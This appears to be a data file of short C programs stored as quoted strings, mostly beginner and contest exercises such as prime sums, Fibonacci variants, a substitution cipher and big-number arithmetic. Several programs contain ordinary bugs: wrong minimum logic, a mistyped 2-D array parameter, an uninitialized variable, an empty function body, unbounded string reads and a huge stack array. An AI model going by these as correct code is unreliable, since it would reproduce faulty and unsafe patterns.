    "#include <stdio.h>\n#include <pthread.h>\nunsigned next_seed = 1;\nunsigned rand(void)\n{\n    next_seed = next_seed * 1103515245 + 12543;\n    return (unsigned)(next_seed >> 16) % 32768;\n}\nvoid srand(unsigned new_seed)\n{\n    next_seed = new_seed;\n}\nint main()\n{\n    srand(0);\n    printf(\"%u\\n\", rand());\n    printf(\"%u\\n\", rand());\n    printf(\"%u\\n\", rand());\n}",
    "#include <stdio.h>\nstatic int N;\nstatic int T;\nstatic int IP_Ret;\nstatic void CkPair(int a, int b)\n{\n IP_Ret = IP_Ret || a == N && b == T || a == T && b == N;\n}\nstatic int IsPair(void)\n{\n int i;\n IP_Ret = 0;\n for(i = 1; i <= 15; i++)\n  CkPair(i, i + 5);\n for(i = 1; i <= 4; i++)\n {\n  CkPair(i, i + 1);\n  CkPair(i + 6, i + 10);\n  CkPair(i + 15, i + 16);\n }\n CkPair(1, 5);\n CkPair(6, 15);\n CkPair(16, 20);\n return IP_Ret;\n}\nint main()\n{\n int f = 0;\n scanf(\"%d\", &N);\n for(T = 1; T <= 20; T++)\n {\n  if(IsPair())\n  {\n   if(f)\n    printf(\",\");\n   else\n    f = 1;\n   printf(\"%d\", T);\n  }\n }\n printf(\"\\n\");\n}",
    "#include <stdio.h>\nint main(){\n   float num1 ,quadrado;\n   printf(\"digite o numero : \");\n   scanf(\"%f\",&num1);\n   quadrado = num1 * num1;\n   printf(\"o resultado e : %.3f\",quadrado);\n    return 0 ;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(){\n char str[233];\n long result = 0;\n scanf(\"%s\",str);\n for(int i=0;i<strlen(str);i++) {\n        int num = str[i] - '0';\n        result *= 10;\n        result += num % 2;\n    }\n printf(\"%ld\",result);\n return 0;\n}",
    "#include <stdio.h>\n\n\nint main()\n{\n    float height,cubic_water,power,mass;\n    printf(\"Enter the height and number of cubic meter water \");\n    scanf(\"%f %f\",&height,&cubic_water);\n    mass =cubic_water*1000;\n    power=(0.9*(height*mass*9.80))/1000000;\n    printf(\"Power generated with 90 efficiency %.2f MW\\n\",power);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char c;\n    printf(\"Enter a character: \");\n    scanf(\"%c\", &c);\n    printf(\"ASCII value of %c = %d\", c, c);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n#include <stdbool.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    uint64_t prime_limit = 2000000;\n    uint64_t sum = 0;\n    uint64_t *primes = malloc(prime_limit * sizeof(*primes));\n    uint64_t *starting_mult = malloc(prime_limit * sizeof(*starting_mult));\n    primes[0] = 2;\n    starting_mult[0] = 4;\n    primes[1] = 3;\n    starting_mult[1] = 9;\n    sum += 2 + 3;\n    unsigned int num_primes = 2;\n    for (unsigned int n = 6; n-1 < prime_limit; n += 6) {\n        unsigned int x = n-1;\n        uint64_t limit = sqrt(x) + 1;\n        _Bool is_prime = 1;\n        for (unsigned int p = 0; p < num_primes; ++p) {\n            uint64_t prime = primes[p];\n            if (prime > limit) {\n                break;\n            }\n            uint64_t mult = starting_mult[p];\n            while (mult < x) {\n                mult += prime;\n            }\n            if (mult == x) {\n                is_prime = 0;\n                break;\n            }\n        }\n        if (is_prime) {\n            primes[num_primes] = x;\n            starting_mult[num_primes] = x * x;\n            num_primes += 1;\n            sum += x;\n        }\n        x = n+1;\n        limit = sqrt(x) + 1;\n        is_prime = 1;\n        for (unsigned int p = 0; p < num_primes; ++p) {\n            uint64_t prime = primes[p];\n            if (prime > limit) {\n                break;\n            }\n            uint64_t mult = starting_mult[p];\n            while (mult < x) {\n                mult += prime;\n            }\n            if (mult == x) {\n                is_prime = 0;\n                break;\n            }\n        }\n        if (is_prime) {\n            primes[num_primes] = x;\n            starting_mult[num_primes] = x * x;\n            num_primes += 1;\n            sum += x;\n        }\n    }\n    printf(\"sum: %lu\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n double ans = 0;\n int first = 1, second = 2, third;\n for (int i = 0; i < 20; i++){\n  ans += (double)second / first;\n  third = first + second;\n  first = second; second = third;\n }\n printf(\"%lf\\n\", ans);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n FILE *fp;\n if((fp = fopen(\"D:\\\\VS\\\\lab_network\\\\configue.txt\",\"r\")) == ((void*)0))\n {\n perror(\"fail to read\");\n exit (1) ;\n }\n char temp[1024];\n int UDPPort;\n int DataSize;\n int ErrorRate;\n int LostRate;\n int SWSize;\n int InitSeqNo;\n int Timeout;\n fscanf(fp,\"%s = %d\\n\",temp,&UDPPort);\n fscanf(fp,\"%s = %d\\n\",temp,&DataSize);\nfscanf(fp,\"%s = %d\\n\",temp,&ErrorRate);\nfscanf(fp,\"%s = %d\\n\",temp,&LostRate);\nfscanf(fp,\"%s = %d\\n\",temp,&SWSize);\nfscanf(fp,\"%s = %d\\n\",temp,&InitSeqNo);\nfscanf(fp,\"%s = %d\\n\",temp,&Timeout);\nprintf(\"%s=%d\\n\",\"UDPPort\",UDPPort);\nprintf(\"%s=%d\\n\",\"DataSize\",DataSize);\nprintf(\"%s=%d\\n\",\"ErrorRate\",ErrorRate);\nprintf(\"%s=%d\\n\",\"LostRate\",LostRate);\nprintf(\"%s=%d\\n\",\"SWSize\",SWSize);\nprintf(\"%s=%d\\n\",\"InitSeqNo\",InitSeqNo);\nprintf(\"%s=%d\\n\",\"Timeout\",Timeout);\nfclose(fp);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\nint main()\n{\n char pt[30], c[27], ct[30];\n int i, j, index, flag[26];\n printf(\"Implement Mono Alphabetic Cipher Encrytption-Decryption.\\n\");\n printf(\"Enter Plain Text: \");\n scanf(\"%s\", pt);\n int size = strlen(pt);\n for(i = 0; i < 26; i++)\n  flag[i] = 0;\n int a;\n srand(time(0));\n for(i = 0; i < 26; i++)\n {\n  a = rand() % 26;\n  while(flag[a])\n   a = rand() % 26;\n  flag[a] = 1;\n  c[i] = (char)(a + 97);\n }\n printf(\"\\nKeys from a to z:\\n\");\n for(i = 0; i < 26; i++)\n  printf(\"%c - %c\\n\", i + 97, c[i]);\n for(i = 0; i < strlen(pt); i++)\n {\n  index = pt[i] - 97;\n  ct[i] = c[index];\n }\n printf(\"\\nCipher Text is:\\t\");\n for(i = 0; i < strlen(pt); i++)\n {\n  printf(\"%c\", ct[i]);\n }\n printf(\"\\n\");\n  char dt[30];\n  i = 0;\n  while(i < size)\n  {\n  a = 0;\n   while(a != 26)\n  {\n   if(c[a] == ct[i])\n   {\n    dt[i] = a + 97;\n    break;\n   }\n   a++;\n  }\n  i++;\n  }\n  dt[i] = '\\0';\n  printf(\"Decrypted string: %s\\n\", dt);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    double first, second, third;\n    printf(\"Enter 3 numbers: \");\n    if ((scanf(\"%lf %lf %lf\", &first, &second, &third)) != 3)\n    {\n        fprintf((stderr), \"Wrong input values!\");\n        exit(1);\n    }\n    if (first > second && first > third)\n    {\n        printf(\"Biggest: %.1lf\", first);\n    }\n    else if (second > first && second > third)\n    {\n        printf(\"Biggest: %.1lf\", second);\n    }\n    else\n    {\n        printf(\"Biggest: %.1lf\", third);\n    }\n    return (0);\n}",
    "#include <stdio.h>\nint main() {\n char tmp[100] = { 0 };\n int n, k, sum = 0, max;\n scanf(\"%d %d\", &n, &k);\n for (int i = 0; i < k; i++) {\n  scanf(\"%d\", tmp + i);\n  sum += tmp[i];\n }\n max = sum;\n for (int i = k; i < n; i++) {\n  scanf(\"%d\", tmp + i);\n  sum += tmp[i] - tmp[i - k];\n  if (max < sum) max = sum;\n }\n printf(\"%d\", max);\n}",
    "#include <stdio.h>\n\n\nfloat years_rainfall(const float ar[][12]);\nvoid months_avg(const float ar[][12]);\nint main(void)\n{\n const float rain[5][12] =\n {\n  {4.3,4.3,4.3,3.0,2.0,1.2,0.2,0.2,0.4,2.4,3.5,6.6},\n  {8.5,8.2,1.2,1.6,2.4,0.0,5.2,0.9,0.3,0.9,1.4,7.3},\n  {9.1,8.5,6.7,4.3,2.1,0.8,0.2,0.2,1.1,2.3,6.1,8.4},\n  {7.2,9.9,8.4,3.3,1.2,0.8,0.4,0.0,0.6,1.7,4.3,6.2},\n  {7.6,5.6,3.8,2.8,3.8,0.2,0.0,0.0,0.0,1.3,2.6,5.2}\n };\n float total;\n printf(\"\\nTOTAL RAINFALL FOR EACH YEAR:\\n\\n\");\n total = years_rainfall(rain);\n printf(\"THE YEARLY AVERAGE IS:\\n\\n %.1f inches.\\n\", total/5);\n printf(\"\\nTHE MONTHLY AVERAGES ARE:\\n\");\n months_avg(rain);\n return 0;\n}\nfloat years_rainfall(const float ar[][12])\n{\n int year, month;\n float subtotal, total;\n printf(\" year   rainfall (inches)\\n\");\n for (year = 0, total = 0; year < 5; year++)\n {\n  for (month = 0, subtotal = 0; month < 12; month++)\n  {\n   subtotal += ar[year][month];\n  }\n  printf(\"%5d %12.1f\\n\", 2000 + year, subtotal);\n  total += subtotal;\n }\n putchar('\\n');\n return total;\n}\nvoid months_avg(const float ar[][12])\n{\n int month, year;\n float subtotal;\n printf(\"\\n Jan   Feb   Mar   Apr   May   Jun   Jul   Aug   Sep   Oct   Nov   Dec\\n\");\n for (month = 0; month < 12; month++)\n {\n  for (year = 0, subtotal = 0; year < 5; year++)\n  {\n   subtotal += ar[year][month];\n  }\n  printf(\" %-4.1f \", subtotal);\n }\n printf(\"\\n\\n\");\n}",
    "#include <stdio.h>\nint floyds(int n)\n{\n    int i, j, count = 0, r;\n    for (i = 1; i <= n; i++)\n    {\n        for (j = 1; j <= i; j++)\n        {\n            printf(\"%d \", ++count);\n        }\n        printf(\"\\n\");\n    }\n}\nint main()\n{\n    int n;\n    printf(\"\\n Enter Number of Terms: \");\n    scanf(\"%d\", &n);\n    floyds(n);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint a[600],b[600];\nchar sa[600],sb[600];\nint ans[600];\nint jf(int *x,int *y,int xl,int yl,int *anss){\n for(int i=0 ; i<yl ; i++){\n  anss[xl-i+1] += x[xl-i-1] - y[yl-i-1];\n  while(anss[xl-i+1] < 0){\n   anss[xl-i]--;\n   anss[xl-i+1] += 10;\n  }\n }\n for(int i=0 ; i<xl-yl ; i++){\n  anss[xl-yl-i+1] += x[xl-yl-i-1];\n  while(anss[xl-yl-i+1] < 0){\n   anss[xl-yl-i]--;\n   anss[xl-yl-i+1] += 10;\n  }\n }\n return 0;\n}\nint main(){\n while(scanf(\"%s %s\",&sa,&sb) != (-1)){\n  memset(a,-1,sizeof(a));\n  memset(b,-1,sizeof(b));\n  memset(ans,0,sizeof(ans));\n  int la = 0;\n  int lb = 0;\n  int i;\n  for(i=0 ; sa[i]!='\\0' ; i++){\n   a[i] = sa[i] - '0';\n  }\n  la = i;\n  for(i=0 ; sb[i]!='\\0' ; i++){\n   b[i] = sb[i] - '0';\n  }\n  lb = i;\n  int abiger = 0;\n  if(la > lb){\n   abiger = 1;\n  }\n  else if(la == lb){\n   int i;\n   for(i=0;i<la;i++){\n    if(a[i] > b[i]){\n     abiger = 1;\n     break;\n    }\n    if(a[i] < b[i]){\n     abiger = 0;\n     break;\n    }\n   }\n   if(i == la){\n    printf(\"0\\n\");\n    continue;\n   }\n  }\n  else{\n   abiger = 0;\n  }\n  if(abiger){\n   jf(a,b,la,lb,ans);\n   int i=0;\n   while(ans[i] == 0){\n    i++;\n   }\n   for(;i<=la+1;i++){\n    printf(\"%d\",ans[i]);\n   }\n  }\n  else{\n   jf(b,a,lb,la,ans);\n   printf(\"-\");\n   int i=0;\n   while(ans[i] == 0){\n    i++;\n   }\n   for(;i<=lb+1;i++){\n    printf(\"%d\",ans[i]);\n   }\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\n\nint main(){\n float x0,x1,x2,error;\n int i=0;\n printf(\"Input Two Approximations: \");\n scanf(\"%f %f\",&x0,&x1);\n printf(\"Ite\\tX0\\t\\tX1\\t\\tf(X0)\\t\\tf(X1)\\t\\tError\\n\");\n do{\n x2=((x0*(pow(x1,3)-18))-((x1)*(pow(x0,3)-18)))/(((pow(x1,3)-18)-(pow(x0,3)-18)));\n printf(\"%2d\\t%4.6f\\t%4.6f\\t%4.6f\\t%4.6f\\t%4.6f\\n\",i++,x0,x1,(pow(x0,3)-18),(pow(x1,3)-18),error);\n error=fabs((x2)-(x1));\n x0=x1;\n x1=x2;\n }while(error>0.00005);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nvoid sqrseq(int pos, int *seq, int lim, int *sqr, int sqrn, int *curmax) {\n  if(pos > *curmax) {\n    *curmax = pos;\n    printf(\"SEQ{%02d}:\", pos);\n    for(int j = 0; j < lim; j++) {\n    printf(\" %02d\", seq[j]);\n    }\n    printf(\"\\n\");\n  }\n  if(pos == lim) {\n    free(seq);\n    return;\n  }\n  for(int i = pos; i < lim; i++) {\n    if(pos > 0) {\n      int sum = seq[pos - 1] + seq[i];\n      int in = 0;\n      for(int j = 0; j < sqrn; j++) {\n        if(sqr[j] == sum) {\n          in = 1;\n          break;\n        }\n      }\n      if(!in) {\n        continue;\n      }\n    }\n    int *nseq = malloc(lim * sizeof(int));\n    for(int j = 0; j < pos; j++) {\n      nseq[j] = seq[j];\n    }\n    nseq[pos] = seq[i];\n    int offset = -1;\n    for(int j = pos + 1; j < lim; j++) {\n      if(seq[i] == seq[j - 1])\n        offset = 0;\n      nseq[j] = seq[j + offset];\n    }\n    sqrseq(pos + 1, nseq, lim, sqr, sqrn, curmax);\n  }\n  free(seq);\n}\nint main(int argc, char **argv) {\n  if(argc < 2) {\n    return 1;\n  }\n  int lim = atoi(argv[1]);\n  if(lim < 2) {\n    return 1;\n  }\n  int i = 1, i2 = 1;\n  int *sqr = malloc(sizeof(int)), sqrn = 0;\n  while(i2 <= 2 * lim - 1) {\n    sqr = (int*) realloc(sqr, (sqrn + 1) * sizeof(int));\n    sqr[sqrn++] = i2;\n    i++;\n    i2 = i * i;\n  }\n  int *seq = malloc(lim * sizeof(int));\n  for(int i = 0; i < lim; i++) {\n    seq[i] = i + 1;\n  }\n  int curmax = 0;\n  sqrseq(0, seq, lim, sqr, sqrn, &curmax);\n  free(sqr);\n  return 0;\n}",
    "int printf(const char *, ...);\nint k;\nlong g;\nlong *l = &g;\nfloat h[] = {1.1f, 2.2f, 3.3f};\nfloat *i = &h[1];\nshort j = 0;\nint main(void) {\n   int n = 5L;\n   k = (n = (j));\n   (*l) = (0x841EC489769724D4LL);\n   (*i) = n;\n   return printf(\"%f\\n\", h[1]);\n}",
    "#include <stdio.h>\nvoid diff(int a, int b, int *e){\n    int diff = e[b]-e[a-1];\n    printf(\"%d\\n\",diff);\n}\nint main(int argc, char const *argv[])\n{\n    int baku,energy;\n    scanf(\"%d\\n\",&baku);\n    int nbaku[baku], energysum[baku];\n    nbaku[0] = 0;\n    for(int i = 1; i <= baku; i++){\n        scanf(\"%d \",&energy);\n        nbaku[i] = energy;\n    }\n    energysum[0] = 0;\n    for (int j = 1; j<=baku; j++){\n        energysum[j] = nbaku[j] + energysum[j-1];\n    }\n    int a,b,casos;\n    scanf(\"%d\\n\",&casos);\n    for (int z = 0; z < casos; z++){\n        scanf(\"%d %d\\n\",&a,&b);\n        diff(a,b,energysum);\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(int argc, char *argv[]) {\n    FILE *fp;\n    char buffer[80];\n    for (int i = 1; i < argc; i++) {\n        fp = fopen(argv[i], \"r\");\n        if (fp == ((void*)0)) {\n            printf(\"my-cat: cannot open file\\n\");\n            exit(1);\n        }\n        while (1){\n            if (fgets(buffer, 80, fp)!= ((void*)0))\n                printf(\"%s\", buffer);\n        else\n            break;\n        }\n        fclose(fp);\n    }\n}",
    "#include <stdio.h>\nint sizeof_file(char *filename) {\n    FILE *in = fopen(filename, \"rt\");\n    if (!in) {\n        return -1;\n    }\n    fseek(in, 0, (2));\n    int bytes = ftell(in);\n    fclose(in);\n    return bytes;\n}\nint main()\n{\n    char filename[] = \"data.in\";\n    int file_size = sizeof_file(filename);\n    if (file_size < 0) {\n        fprintf((stderr), \"Error: Can't open file %s\\n\", filename);\n        return -1;\n    }\n    printf(\"file_size: %d bytes\\n\", file_size);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n double pi=3.14159 ,raio ,volume;\n scanf(\"%lf\" ,&raio);\n volume = pow(raio ,3) * (4/3.0) * pi;\n printf(\"VOLUME = %.3lf\\n\" ,volume);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint fib(int n){\n    int t0 = 0, t1 = 1, s = 0, i;\n    if (n <= 1){\n        return n;\n    }\n    for(i = 1; i <= n; i++){\n        s = t0 + t1;\n        t0 = t1;\n        t1 = s;\n    }\n    return s;\n}\nint rfib(int n){\n    if(n <= 1){\n         return n;\n    }\n    return rfib(n-2) + rfib(n-1);\n}\nint *F;\nint _memofib(int n);\nint memofib(int n){\n    F = (int*) malloc(n * sizeof(int));\n    int i = 0;\n    for(i = 0; i < n; i++){\n        F[i] = -1;\n    }\n    int result = _memofib(n);\n    free(F);\n    return result;\n}\nint _memofib(int n){\n    if(n <= 1){\n        F[n] = n;\n        return n;\n    }\n    else{\n        if(F[n-2] == -1){\n            F[n-2] = _memofib(n - 2);\n        }\n        if(F[n-1] == -1){\n            F[n-1] = _memofib(n - 1);\n        }\n        F[n] = F[n-2] + F[n-1];\n        return F[n-2] + F[n-1];\n    }\n}\nint main(){\n    printf(\"Iterative: %d \\n\", fib(6));\n    printf(\"Recursive: %d \\n\", rfib(6));\n    printf(\"Recursive Memo: %d \\n\", memofib(6));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar inp[100];\nint main()\n{\n    int cases, idx, count=1;\n    scanf(\"%d\", &cases);\n    while(cases--){\n        scanf(\" %d %s\", &idx, inp);\n        if(strlen(inp) > 80 || idx > strlen(inp))\n            return 1;\n        idx--;\n        memmove(inp+idx, inp+idx+1, strlen(inp)-idx);\n        printf(\"%d %s\\n\", count++, inp);\n        memset(inp,0,sizeof(inp));\n    }\n    return 0;\n}",
    "#include <stdio.h>\nunsigned char aa[] = \"asdffeagewaHAFEFaeDsFEawFdsFaefaeerdjgpim23\";\nunsigned short icrc(unsigned short crc, unsigned char *lin, unsigned int len, short jinit, int jrev)\n{\n}\nint main()\n{\n  unsigned short i1, i2;\n  int n;\n  i2 = icrc(i1, aa, 42, (short) -1, 1);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n  int i, k, p=0, m;\n  float a[1000],nov[64], sum=0, del;\n  i=0;\n  while(scanf(\"%f\", &a[i]) != (-1)){\n    p++;\n    nov[i]=a[i];\n    for (m = 0; m < i; m++) {\n      if (a[i] == a[m] && i!=m) {\n        p--;\n        i--;\n        break;\n      }\n    }\n    i++;\n  }\n  k=0;\n  while(k<i){\n    del = fmod(nov[k],p);\n    sum = sum + del;\n    k++;\n    }\n  printf(\"%d\\n%.3f\", p, sum);\n  return 0;\n}",
    "#include <stdio.h>\nint digit(int n, int k)\n{\n   int i;\n   for (i = 1; i < k; i++) {\n      n /= 10;\n   }\n   return n % 10;\n}\nint main(void)\n{\n   int n, k;\n   printf(\"Enter number and position: \");\n    scanf(\"%d %d\", &n, &k);\n   printf(\"Digit at position %d of number %d is: %d\\n\", k, n, digit(n, k));\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\n\nint main(void) {\n        int num=10;\n        int i,c=0;\n        int *out;\n        int *res;\n        int t[100];\n        scanf(\"%d\", &num);\n        out = (int*)malloc(sizeof(int) * (num+1));\n        res = (int*)malloc(sizeof(int) * (num+1));\n        out[1] = 0;\n        res[1] = 0;\n        for(i=2; i <= num; i++) {\n                out[i] = out[i-1] + 1;\n                res[i] = 1;\n                if (i%2 == 0) {\n                    if ((out[i/2] + 1) < out[i]) {\n                        res[i] = 2;\n                    }\n                    out[i] = ((1 + out[i/2]) < (out[i])) ? (1 + out[i/2]) : (out[i]);\n                }\n                if (i%3 == 0) {\n                    if ((out[i/3] + 1) < out[i]) {\n                        res[i] = 3;\n                    }\n                    out[i] = ((1 + out[i/3]) < (out[i])) ? (1 + out[i/3]) : (out[i]);\n                }\n        }\n        printf(\"%d\\n\", out[num]);\n        for (i = out[num]; i > 0; i--) {\n            if (res[num] == 1) {\n             t[c++]=num - 1;\n                num = num - 1;\n                printf(\"%d \",num);\n            } else if (res[num] == 2) {\n             t[c++]=num / 2;\n                num = num / 2;\n                 printf(\"%d \",num);\n            } else {\n             t[c++]=num / 3;\n                num = num / 3;\n                 printf(\"%d \",num);\n            }\n        }\n        printf(\"\\n\");\n        return 0;\n}",
    "#include<stdio.h>\nvoid flipAndInvertImage(int** A, int ARowSize, int AColSizes);\nint main(int argc, char const *argv[]) {\n  int a[][3] = {{1,1,0},{1,0,1},{0,0,0}};\n  flipAndInvertImage(a, 3,3);\n  for (int i = 0; i < 3; i++) {\n    for (int j = 0; j < 3; j++) {\n      printf(\"%d\\n\",a[i][j]);\n    }\n  }\n  return 0;\n}\nvoid flipAndInvertImage(int** A, int ARowSize, int AColSizes) {\n  for (int i = 0; i < ARowSize; i++)\n    for (int j = 0; j < AColSizes; j++) {\n      int tmp = A[i][j];\n      A[i][j] = A[i][AColSizes - j -1];\n      A[i][AColSizes - j -1] = tmp;\n      A[i][j] = 1 - A[i][j];\n    }\n}",
    "#include<stdio.h>\nint main()\n{\n    int n;\n    printf(\"Enter a number: \");\n    scanf(\"%d\", &n);\n    if(n%2==0)\n    {\n        printf(\"%d is a even number.\",n);\n    }\n    else\n    {\n        printf(\"%d is a odd number.\",n);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nvoid print_f(double x)\n{\n long i, j = 6;\n long p;\n i = (long) x;\n printf(\"%d.\", i);\n x = x - i;\n while (j--) {\n  x *= 10;\n  p = (long) (x);\n  x = x - p;\n  printf(\"%d\", p);\n }\n printf(\"   \");\n}\n\nint main(void)\n{\n double i, j;\n int p;\n printf(\"\\nmodf :\");\n j = modf(100.123, &i);\n print_f(i);\n print_f(j);\n j = modf(100.00, &i);\n print_f(i);\n print_f(j);\n j = modf(0.123, &i);\n print_f(i);\n print_f(j);\n printf(\"\\nfrexp :\");\n j = frexp(100.123, &p);\n printf(\"%d  \",p);\n print_f(j);\n print_f(ldexp(j,p));\n j = frexp(100.00, &p);\n printf(\"%d  \",p);\n print_f(j);\n print_f(ldexp(j,p));\n j = frexp(0.123, &p);\n printf(\"%d  \",p);\n print_f(j);\n print_f(ldexp(j,p));\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int cod1, cod2, num1, num2;\n    double val1, val2;\n    scanf(\"%i %i %lf\\n\", &cod1, &num1, &val1);\n    scanf(\"%i %i %lf\\n\", &cod2, &num2, &val2);\n    printf(\"VALOR A PAGAR: R$ %.2f\\n\", (num1*val1 + num2*val2));\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int N, X;\n    scanf(\"%d\", &N);\n    while (N > 0) {\n        scanf(\"%d\", &X);\n        if (X % 2 == 0 && X > 0) {\n            printf(\"EVEN POSITIVE\\n\");\n        } else if (X % 2 == 0 && X < 0) {\n            printf(\"EVEN NEGATIVE\\n\");\n        } else if (X % 2 != 0 && X > 0) {\n            printf(\"ODD POSITIVE\\n\");\n        } else if (X % 2 != 0 && X < 0) {\n            printf(\"ODD NEGATIVE\\n\");\n        } else if (X == 0) {\n            printf(\"NULL\\n\");\n        }\n        N--;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int i, sum = 0;\n    for (i=0; i <= 10000; i++) {\n        sum = sum + i;\n    }\n    printf(\"1 \ubd80\ud130 10000 \uae4c\uc9c0\uc758 \ud569 %d \\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char c;\n    printf(\"Write a character and press Enter: \");\n    scanf(\"%c\", &c);\n    printf(\"\\nASCII value of a character is: \\n\");\n    printf(\"Decimal: %d \\nHexadecimal: %X \\nOctal: %o\", c, c, c);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char array_char[1024*1024*1024] = {0};\n    array_char[0] = 'a';\n    printf(\"%s \\n\", array_char);\n    getchar();\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n char ch[100];\n unsigned int num;\n int i,max=0,zero=0;\n printf(\"input: \");\n scanf(\"%d\",&num);\n getchar();\n sprintf(ch,\"%d\",num);\n for(i=0;ch[i] != '\\0';i++){\n  if( (ch[i] - '0') > max ){\n   max = ( ch[i] -'0' );\n  }\n  if( ch[i] == '0' ){\n   zero++;\n  }\n }\n printf(\"\u6570\u503c\u6700\u5927\u7684\u4e3a%d\\n\",max);\n printf(\"\u5219\u6570\u5b57\u503c\u4e3a\u96f6\u7684\u4e2a\u6570\u4e3a%d\\n\",zero);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\nint main(int argc, char *argv[]) {\n    int r;\n    if (argc < 2) {\n        fprintf((stderr), \"usage: %s number\\n\", argv[0]);\n        exit(1);\n    }\n    errno = 0;\n    r = atoi(argv[1]);\n    if (r == 0) {\n        if (errno != 0) {\n            perror(\"atoi\");\n            exit(1);\n        }\n    }\n    printf(\"%d\\n\", r);\n    return 0;\n}",
    "int main()\n{\n int a;\n int b;\n return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint wordcount();\nint main(){\n    int words = wordcount();\n    printf(\"string contain words : %d\\n\",words);\n    return 0;\n}\nint wordcount(){\n    int count = 0;\n    int c;\n    _Bool Inword = 0;\n    while((c = getchar()) != (-1)){\n        if(c == ' ' || c == '\\t' || c == '\\n')\n            Inword = 0;\n        else if(!Inword){\n            count++;\n            Inword = 1;\n        }\n    }\n    return count;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar * multiply(char * num1, char * num2){\n    int len1 = (int)strlen(num1);\n    int len2 = (int)strlen(num2);\n    if (len1 <= 0 || len2 <= 0) { return \"\"; }\n    int *sums = (int *)malloc(sizeof(int) * (len1 + len2));\n    for (int i = 0; i < (len1 + len2); i++) {\n        sums[i] = 0;\n    }\n    for (int i = len1 - 1; i >= 0; i--) {\n        for (int j = len2 - 1; j >= 0; j--) {\n            int tempSum = (num1[i] - '0') * (num2[j] - '0');\n            tempSum += sums[i+j+1];\n            sums[i+j+1] = tempSum % 10;\n            sums[i+j] += tempSum / 10;\n        }\n        for (int a = 0; a < len1+len2; a++) {\n            printf(\"%d \", sums[a]);\n        }\n        printf(\"\\n\");\n    }\n    int n = 0;\n    for (n = 0; n < len1 + len2; n++) {\n        if (sums[n] != 0) { break; }\n    }\n    if (n == len1 + len2) { n -= 1; }\n    char *res = (char *)malloc(sizeof(char) * (len1 + len2 - n + 1));\n    res[len1 + len2 - n] = '\\0';\n    for (int i = 0; i < (len1 + len2 - n); i++) {\n        res[i] = sums[n+i] + '0';\n    }\n    return res;\n}\nint main(int argc, const char * argv[]) {\n    char *a = multiply(\"0\", \"0\");\n    char *b = multiply(\"123\", \"456\");\n    printf(\"0 x 0 = %s\\n 123 x 456 = %s\\n\", a, b);\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nstatic void foo(int x)\n{\n    if (x > 0) {\n        puts(\"x > 0\");\n    } else {\n        puts(\"x <= 0\");\n    }\n}\nstatic void bar(int x_low, int x_high)\n{\n    for(int i = x_low; i < x_high; ++i) {\n        if (i % 2000 == 0) sleep(1);\n        if (i % 8 == 0) {\n            puts(\"evenly divisible by 8\");\n        } else {\n            foo(i);\n        }\n    }\n}\nint main(int argc, char** argv)\n{\n    foo(1);\n    bar(1, 5);\n    bar(1000, 5000);\n    return 0;\n}",
    "#include <stdio.h>\nint is_letter(char);\nint main(void)\n{\n    char ch;\n    printf(\"Enter: \\n\");\n    while((ch=getchar()) != (-1))\n    {\n        int letter_position;\n        if((letter_position=is_letter(ch))!=-1)\n            printf(\"Position of letter %c is: %d\\n\",ch,letter_position+1);\n    }\n    printf(\"Done!\");\n    return 0;\n}\nint is_letter(char ch)\n{\n    int position = -1;\n    if(ch>=65 && ch<=90)\n        position=ch%65;\n    else if(ch>=97 && ch<=122)\n        position=ch%97;\n    return position;\n}",
    "#include <stdio.h>\nint main()\n{\n    int book[1001], i, j, t, n;\n for(i=0; i<=1000; i++)\n {\n     book[i] = 0;\n }\n scanf(\"%d\", &n);\n for(i=1; i<=n; i++)\n {\n     scanf(\"%d\", &t);\n  book[t]++;\n }\n for(i=1000; i>=0; i--)\n {\n  for(j=1; j<=book[i]; j++)\n  {\n         printf(\"%d, \", i);\n  }\n }\n getchar();getchar();\n return 0;\n}",
    "#include <unistd.h>\nstatic void x() {\n  static const char str[] = \"Hello World!\\n\";\n  write(1,str,sizeof(str));\n}\nint main() {x(); return 42;}",
    "#include <stdio.h>\nint main(){\nint x, y, z, t, a;\nprintf(\"Please enter 4 numbers separated by spaces > \");\nscanf(\"%d %d %d %d\", &x, &y, &z, &t);\nif (x>=y)\na = y;\nelse\na = x;\nif (y>=z)\na = z;\nif (z>=t)\na = t;\nprintf(\"%d is the smallest\\n\", a);\nreturn 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    double x=1.0;\n    for(x=1.0;x<85;x++){\n        if(x/6+x/12+x/7+5+x/2+4==x){\n            printf(\"%.0f\",x-4);\n        }\n    }return 0;\n}",
